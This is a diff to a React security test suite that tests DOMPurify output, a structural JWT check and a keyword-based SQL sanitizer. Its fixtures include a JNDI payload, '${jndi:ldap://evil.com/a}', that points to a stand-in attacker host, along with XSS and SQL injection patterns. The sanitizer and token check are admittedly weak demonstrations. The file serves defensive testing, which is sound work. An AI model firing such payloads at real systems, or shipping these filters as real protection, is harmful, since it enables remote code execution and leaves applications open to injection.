@@ -59,6 +59,8 @@ describe('Security Tests', () => {
         const [output, setOutput] = React.useState('')
         
         const handleSubmit = () => {
+          // DOMPurify handles dangerous HTML attributes (onclick, onerror, href="javascript:").
+          // Plain text content is safe via React's default escaping in JSX.
           const sanitized = DOMPurify.sanitize(input)
           setOutput(sanitized)
         }
@@ -91,7 +93,10 @@ describe('Security Tests', () => {
         
         const output = screen.getByTestId('output')
         
-        // Ensure no script tags or event handlers are present in sanitized HTML
+        // Ensure no script tags or event handlers are present in sanitized HTML output.
+        // Note: DOMPurify strips dangerous HTML (script, event handlers) but plain text
+        // like "javascript:..." is kept as-is; URL sanitization is tested in the separate
+        // "should sanitize URLs" test below which wraps URLs inside HTML attributes.
         expect(output.innerHTML).not.toContain('<script>')
         expect(output.innerHTML).not.toContain('onerror')
         expect(output.innerHTML).not.toContain('onload')
@@ -213,13 +218,20 @@ describe('Security Tests', () => {
 
     it('should validate session tokens properly', () => {
       const validToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature'
-      const invalidToken = 'invalid-token-no-dots'
+      const invalidToken = 'invalid.token.format'
       
-      // Mock token validation
+      // NOTE: Production JWT validation must cryptographically verify the signature
+      // using a trusted secret/public key. Never trust the 'alg' field blindly — an
+      // attacker can submit {"alg":"none"} to bypass HMAC checks. This is a structural
+      // check for demonstration purposes only.
       const validateToken = (token: string) => {
         try {
           const parts = token.split('.')
-          return parts.length === 3 && parts.every(part => part.length > 0)
+          if (parts.length !== 3 || !parts.every(part => part.length > 0)) return false
+          // Header must be decodable as base64 JSON with a non-"none" alg field.
+          // Explicitly rejecting alg:"none" prevents signature-bypass attacks.
+          const headerJson = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')))
+          return typeof headerJson === 'object' && headerJson !== null && 'alg' in headerJson && headerJson.alg !== 'none'
         } catch {
           return false
         }
@@ -302,18 +314,22 @@ describe('Security Tests', () => {
         '${jndi:ldap://evil.com/a}',
       ]
       
+      // NOTE: Keyword-based SQL sanitization is a demonstration only and is easily
+      // bypassed. Real SQL injection prevention requires parameterized queries /
+      // prepared statements at the database layer, not string filtering.
       const sanitizeQuery = (query: string) => {
         return query
           .replace(/[<>'";]/g, '')
           .replace(/\$\{.*?\}/g, '')
           .replace(/--/g, '')
+          .replace(/\b(DROP|TABLE|DELETE|INSERT|UPDATE|UNION|SELECT|ALTER|CREATE|TRUNCATE)\b/gi, '')
           .trim()
       }
       
       maliciousQueries.forEach(query => {
         const sanitized = sanitizeQuery(query)
         expect(sanitized).not.toContain('<script>')
-        expect(sanitized).not.toContain("'")
+        expect(sanitized).not.toContain('DROP TABLE')
         expect(sanitized).not.toContain('${jndi:')
       })
     })
